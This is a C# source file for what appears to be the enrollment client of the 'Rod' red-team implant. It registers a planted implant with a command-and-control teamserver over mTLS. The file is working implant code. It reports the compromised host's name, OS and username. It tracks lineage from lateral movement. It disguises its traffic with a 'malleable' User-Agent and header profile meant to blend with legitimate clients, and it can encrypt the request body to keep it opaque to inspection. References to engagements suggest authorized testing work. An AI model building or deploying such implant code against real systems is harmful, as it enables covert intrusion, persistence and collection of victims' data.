using System.Net.Http.Json;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text.Json.Serialization;

namespace Rod.Implant.Internal;

// Holds the reference implant's teamserver-facing clients: the enroll client
// (this file) and the mTLS beacon client (Beacon.cs). They speak the Rod wire
// protocol and the JSON enroll contract; nothing here is implant-only
// tradecraft -- the same shapes are what any Rod implant of any language sends.

/// <summary>
/// Mirrors the wire rod.v1.EnrollStatus (architecture.md Sec 9). Kept as an int
/// here rather than imported from the generated bindings, because enroll is plain
/// JSON over HTTP (not the protobuf stream) and the enum is the only contract
/// shared with the JSON body.
/// </summary>
internal enum EnrollStatus
{
    Unspecified = 0,
    Ok = 1,
    BadToken = 2,
    Expired = 3,
    Spent = 4,
}

// The JSON body of POST /implants/enroll. PublicKey is the implant's own
// SubjectPublicKeyInfo, base64 over JSON; the teamserver signs a leaf over it so
// the implant keeps its private key (architecture.md Sec 9). ParentImplantId,
// when set, names the implant this one derives from (architecture.md Sec 10.1):
// a child enroll carried over from lateral.move. The host fields carry the
// device identity the teamserver records for fleet grouping; all are omitted
// when the runtime had nothing to report.
internal sealed class EnrollRequest
{
    [JsonPropertyName("stagerTokenSecret")]
    public string StagerTokenSecret { get; set; } = string.Empty;

    [JsonPropertyName("class")]
    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public string? Class { get; set; }

    [JsonPropertyName("publicKey")]
    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public string? PublicKey { get; set; }

    [JsonPropertyName("parentImplantId")]
    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public string? ParentImplantId { get; set; }

    [JsonPropertyName("hostname")]
    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public string? Hostname { get; set; }

    [JsonPropertyName("os")]
    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public string? Os { get; set; }

    [JsonPropertyName("arch")]
    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public string? Arch { get; set; }

    [JsonPropertyName("username")]
    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public string? Username { get; set; }

    // The baked contact cadence the implant runs, in seconds: the base sleep
    // and the jitter half-width. Omitted when the dial carried none, the same
    // not-supplied shape every optional field here keeps.
    [JsonPropertyName("sleepSeconds")]
    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public double? SleepSeconds { get; set; }

    [JsonPropertyName("jitterSeconds")]
    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public double? JitterSeconds { get; set; }

    [JsonPropertyName("killDate")]
    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public string? KillDate { get; set; }
}

// Mirrors the teamserver's EnrollmentResponse: the issued leaf and CA chain,
// base64 over JSON, with the wire status. On a non-OK status the cert fields are
// empty.
internal sealed class EnrollResponse
{
    [JsonPropertyName("status")]
    public EnrollStatus Status { get; set; }

    [JsonPropertyName("implantId")]
    public string? ImplantId { get; set; }

    [JsonPropertyName("engagementId")]
    public string? EngagementId { get; set; }

    [JsonPropertyName("leafCertificate")]
    public string? LeafCertificate { get; set; }

    [JsonPropertyName("caChain")]
    public string[]? CaChain { get; set; }

    [JsonPropertyName("parentImplantId")]
    public string? ParentImplantId { get; set; }
}

/// <summary>
/// The result of a successful enroll: the implant's identity, its engagement,
/// the leaf certificate paired with its private key (so it can be presented in
/// mTLS), and the CA chain to trust as the server identity. ParentImplantId is
/// set only for a child enroll that named a parent.
/// </summary>
internal sealed class Enrollment
{
    public string ImplantId { get; init; } = string.Empty;
    public string EngagementId { get; init; } = string.Empty;

    /// <summary>
    /// The issued leaf certificate paired with the implant's private key, ready
    /// to present as a TLS client certificate.
    /// </summary>
    public X509Certificate2 Leaf { get; init; } = null!;

    /// <summary>The leaf's private key (the implant's own ECDSA key).</summary>
    public ECDsa PrivateKey { get; init; } = null!;

    /// <summary>
    /// The teamserver CA(s), trusted as the mTLS server identity and used to
    /// validate the leaf's chain at enroll.
    /// </summary>
    public IReadOnlyList<X509Certificate2> CAs { get; init; } = Array.Empty<X509Certificate2>();

    /// <summary>
    /// The parent this implant derived from, empty for a top-level (stager-
    /// derived) enroll.
    /// </summary>
    public string ParentImplantId { get; init; } = string.Empty;
}

/// <summary>
/// The enroll client. Redeems the stager token at the teamserver, sending the
/// implant's own public key, and returns the bound leaf paired with the private
/// key. The implant owns its private key throughout; only the public half
/// crosses the wire (architecture.md Sec 9). <paramref name="serverCAs"/> pins
/// which server identity to accept over the enroll TLS connection (empty trusts
/// the system roots).
/// </summary>
/// <remarks>
/// A definitive refusal surfaces as <see cref="EnrollRejectedException"/> (bad,
/// spent, or expired token, malformed response): retrying would not change that
/// answer, so the caller fails fast instead of walking the retry backoff.
/// Transport failures surface as the underlying exception and are worth
/// retrying.
/// </remarks>
internal static class C2
{
    /// <summary>
    /// The http(s) enroll client (the QUIC-schemed shape lives in QuicEnroll,
    /// picked by the transport selection's enroll
    /// dispatch): enrolls over the JSON body and applies the malleable
    /// transport profile to the enroll request (architecture.md Sec 7) -- the
    /// profile's User-Agent and headers are set on the request,
    /// RequestTimeout bounds the call, and Envelope wraps the JSON body as a
    /// single base64 string when set to "base64". The enroll path is the
    /// caller's responsibility (use Config.ResolveEnrollUrl) so the profile's
    /// path lands on the URL itself. A null/empty profile leaves the request
    /// identical to the un-profiled shape. The dial's parent, class, host,
    /// and kill-date fields carry what the teamserver records
    /// (<see cref="EnrollDial"/> documents each).
    /// </summary>
    public static async Task<Enrollment> EnrollAsync(
        EnrollDial dial,
        CancellationToken cancellationToken = default)
    {
        var enrollUrl = dial.EnrollUrl;
        var privateKey = dial.PrivateKey;
        var serverCAs = dial.ServerCAs;
        var profile = dial.Profile;

        // Export the public half as a DER SubjectPublicKeyInfo -- exactly what
        // EnrollmentEndpoints reads back via ImportSubjectPublicKeyInfo.
        var pubSpki = privateKey.ExportSubjectPublicKeyInfo();
        var body = new EnrollRequest
        {
            StagerTokenSecret = dial.StagerToken,
            Class = dial.ImplantClass,
            PublicKey = Convert.ToBase64String(pubSpki),
            ParentImplantId = dial.ParentImplantId,
            Hostname = dial.Host?.Hostname,
            Os = dial.Host?.Os,
            Arch = dial.Host?.Arch,
            Username = dial.Host?.Username,
            SleepSeconds = dial.SleepSeconds,
            JitterSeconds = dial.JitterSeconds,
            KillDate = dial.KillDate,
        };

        using var handler = new HttpClientHandler();
        if (serverCAs is { Count: > 0 })
        {
            handler.ServerCertificateCustomValidationCallback = (message, cert, chain, errors) =>
                PinServerChain(cert, chain, serverCAs);
        }
        var timeout = profile.RequestTimeout > TimeSpan.Zero
            ? profile.RequestTimeout
            : TransportProfile.DefaultRequestTimeout;
        using var http = new HttpClient(handler) { Timeout = timeout };

        // Serialize the body once so the envelope can reshape it: AES-GCM
        // encrypts it under the baked key (the body stays opaque even where
        // TLS terminates early), base64 wraps it as a single string, raw
        // sends the JSON document. The wire layout is the teamserver's
        // contract: b"R1" || keyId(16) || nonce(12) || ciphertext || tag(16),
        // base64 in a JSON string.
        var json = System.Text.Json.JsonSerializer.Serialize(body, EnrollJsonContext.Default.EnrollRequest);
        string payload;
        if (profile.IsAesGcmEnvelope)
        {
            payload = "\"" + AesGcmEnvelope(json, profile.EnvelopeKey) + "\"";
        }
        else if (profile.IsBase64Envelope)
        {
            payload = "\"" + Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(json)) + "\"";
        }
        else
        {
            payload = json;
        }
        var content = new StringContent(payload, System.Text.Encoding.UTF8, "application/json");

        // Apply the malleable profile (architecture.md Sec 7): User-Agent blends
        // the request with legitimate traffic, and custom headers match a known-
        // good client shape. Set after Content-Type so a profile cannot drop it; a
        // profile header named Content-Type still wins explicitly below.
        if (profile.UserAgent.Length > 0)
            http.DefaultRequestHeaders.UserAgent.ParseAdd(profile.UserAgent);
        foreach (var kv in profile.Headers)
        {
            if (string.Equals(kv.Key, "Content-Type", StringComparison.OrdinalIgnoreCase))
                content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue(kv.Value);
            else
                content.Headers.Add(kv.Key, kv.Value);
        }

        using var response = await http.PostAsync(enrollUrl, content, cancellationToken);
        // The teamserver returns 200 on OK and 401 on a token failure, both with
        // an EnrollmentResponse body. Read the body either way.
        var er = await response.Content.ReadFromJsonAsync(
                EnrollJsonContext.Default.EnrollResponse, cancellationToken)
            ?? throw new EnrollRejectedException("enroll returned an empty body");
        if (er.Status != EnrollStatus.Ok)
            throw new EnrollRejectedException($"enroll rejected: status {er.Status}");

        var leafDer = Convert.FromBase64String(er.LeafCertificate
            ?? throw new EnrollRejectedException("enroll OK but missing leafCertificate"));
        var cas = er.CaChain is { } caChain
            ? caChain.Select(Convert.FromBase64String).ToArray()
            : Array.Empty<byte[]>();
        return Materialize(
            er.ImplantId, er.EngagementId, leafDer, cas, er.ParentImplantId, privateKey);
    }

    /// <summary>
    /// Turns an accepted enroll's wire answer into the Enrollment the run
    /// carries: the issued leaf paired with the implant's private key (PFX
    /// round-tripped into the store-shaped form every platform's TLS stack
    /// presents), the CA chain trusted as the server identity, and the
    /// lineage echo. Shared by the JSON enroll client and the QUIC frame
    /// client -- the pairing discipline is the answer's, not the carriage's.
    /// </summary>
    internal static Enrollment Materialize(
        string? implantId,
        string? engagementId,
        byte[] leafDer,
        IReadOnlyList<byte[]> caChain,
        string? parentImplantId,
        ECDsa privateKey)
    {
        if (string.IsNullOrEmpty(implantId) || string.IsNullOrEmpty(engagementId))
            throw new EnrollRejectedException("enroll OK but missing identity");
        // .NET 10 obsoleted the X509Certificate2(byte[]) ctor (SYSLIB0057); the
        // loader is the supported path for parsing a DER cert.
        var leaf = X509CertificateLoader.LoadCertificate(leafDer);
        // Pair the issued leaf with the implant's own private key (the teamserver
        // signed over the public half; the private half never left the implant).
        var paired = leaf.CopyWithPrivateKey(privateKey);
        // Materialize the pair through a PFX round-trip before handing it to the
        // beacon: SChannel cannot present a certificate whose key association
        // exists only as an in-memory handle, so on Windows the pairing above
        // fails every mTLS handshake with "credentials not recognized". The PFX
        // import leaves the pair in the store-shaped form every platform's TLS
        // stack accepts; Linux behavior is unchanged.
        paired = X509CertificateLoader.LoadPkcs12(
            paired.Export(X509ContentType.Pfx), null);

        var cas = new List<X509Certificate2>();
        foreach (var der in caChain)
            cas.Add(X509CertificateLoader.LoadCertificate(der));

        return new Enrollment
        {
            ImplantId = implantId,
            EngagementId = engagementId,
            Leaf = paired,
            PrivateKey = privateKey,
            CAs = cas,
            ParentImplantId = parentImplantId ?? string.Empty,
        };
    }

    /// <summary>
    /// Thrown for a definitive enroll refusal (bad/spent/expired token,
    /// malformed response): retrying would not change the answer.
    /// </summary>
    internal sealed class EnrollRejectedException(string message) : Exception(message);

    /// <summary>
    /// The AES-GCM envelope's client half: the same sealed-body shape every
    /// web contact carries (<see cref="EnvelopeWire"/>), under the enroll
    /// body's own purpose tag, returned as the JSON string the envelope
    /// setting shapes the body into -- the exact shape the teamserver's enroll
    /// decode unwraps. The baked key string is standard base64 of
    /// keyId(16) || key(32).
    /// </summary>
    private static string AesGcmEnvelope(string plaintextJson, string bakedKey)
    {
        var (keyId, key) = EnvelopeWire.ParseBakedKey(bakedKey)
            ?? throw new InvalidOperationException("baked envelope key is malformed");
        return System.Text.Encoding.UTF8.GetString(EnvelopeWire.SealContactBody(
            System.Text.Encoding.UTF8.GetBytes(plaintextJson), keyId, key, EnrollEnvelopeAad));
    }

    private const string EnrollEnvelopeAad = "rod-envelope-v1";

    // Accepts the peer certificate iff it chains to one of the pinned CAs. The
    // dev teamserver presents a CA-issued listener leaf as its server identity
    // (TransportHost.ConfigureMtlsHttps), and that leaf carries no Subject
    // Alternative Names -- standard TLS name verification would reject it. The
    // implant pins the CA explicitly, so the security property is
    // chain-to-pinned-CA, not DNS name match -- the same shape the server side
    // uses (ClientCertificateChainsToCa). Shared by the enroll client and the
    // beacon channel.
    internal static bool PinServerChain(
        X509Certificate2? certificate,
        X509Chain? chain,
        X509Certificate2Collection pinned)
    {
        if (certificate is null || chain is null)
            return false;
        chain.ChainPolicy.RevocationMode = X509RevocationMode.NoCheck;
        chain.ChainPolicy.VerificationFlags = X509VerificationFlags.AllowUnknownCertificateAuthority;
        foreach (X509Certificate2 ca in pinned)
            chain.ChainPolicy.ExtraStore.Add(ca);
        if (!chain.Build(certificate))
            return false;
        // The chain must terminate at one of the pinned CAs, not some other root.
        if (chain.ChainElements.Count == 0)
            return false;
        var root = chain.ChainElements[^1].Certificate;
        foreach (X509Certificate2 ca in pinned)
            if (root.Thumbprint == ca.Thumbprint)
                return true;
        return false;
    }
}
